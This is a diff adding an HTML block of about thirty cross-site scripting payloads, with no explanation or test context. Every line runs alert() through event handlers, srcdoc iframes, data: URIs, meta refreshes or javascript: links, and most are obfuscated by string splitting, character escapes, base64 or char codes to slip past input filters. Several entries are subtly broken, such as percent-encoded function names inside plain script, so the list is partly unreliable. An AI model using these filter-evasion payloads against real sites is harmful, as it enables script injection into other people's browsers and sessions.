@@ -1,0 +1,32 @@
+```html
+<img src=x onerror=(function(){window['al'+'ert']('\x58SS')})()>
+<svg onload=(function(){window['al'+'ert']('\u0031')})()>
+<iframe srcdoc="<script>window['al'+'ert'](1)</script>"></iframe>
+<object data="data:text/html,<script>al%25ert(1)</script>"></object>
+<meta http-equiv="refresh" content="0;url=javascript:al%65rt%28%31%29">
+<marquee onstart=(function(){window['\x61l\x65r\x74'](1)})()></marquee>
+<details open ontoggle="setTimeout('al'+'ert(1)',0)"></details>
+<svg><a xlink:href="javascript&colon;(function(){al%65rt(1)})()"></a></svg>
+<img src=x onerror="window['\x61l\x65r\x74'](1)">
+<svg onload="window['al'+'ert'](1)"></svg>
+<iframe srcdoc="<svg onload=window['\x61l\x65r\x74'](1)></svg>"></iframe>
+<marquee onstart=eval("al"+"ert(1)")></marquee>
+<object data='data:text/html,<svg onload="al%65rt(1)"></svg>'></object>
+<meta http-equiv="refresh" content="0;url=javascript:(function(){al%65rt(1)})()">
+<svg><script>window['al'+'ert'](1)</script></svg>
+<iframe srcdoc="<svg><script>al%65rt(1)</script></svg>"></iframe>
+<img src=x onerror='eval(atob("YWxlcnQoMSk="))'>
+<svg onload='(function(){al%65rt(1)})()'></svg>
+<object data="data:text/html,<body onload=al%65rt(1)></body>"></object>
+<marquee onstart=window['\x61l\x65r\x74'](1)></marquee>
+<iframe srcdoc="<img src=x onerror=al%65rt(1)>"></iframe>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>
+<object data="data:text/html,<img src=x onerror=al%65rt(1)>"></object>
+<marquee onstart=eval(atob('YWxlcnQoMSk='))></marquee>
+<iframe srcdoc="<object data='data:text/html,<svg onload=al%65rt(1)></svg>'></object>"></iframe>
+<img src=x onerror=window['al'+'ert'](1)>
+<svg onload=window['al'+'ert']('\x58SS')></svg>
+<object data="data:text/html,<svg><script>al%65rt(1)</script></svg>"></object>
+<marquee onstart=(function(){al%65rt(1)})()></marquee>
+```
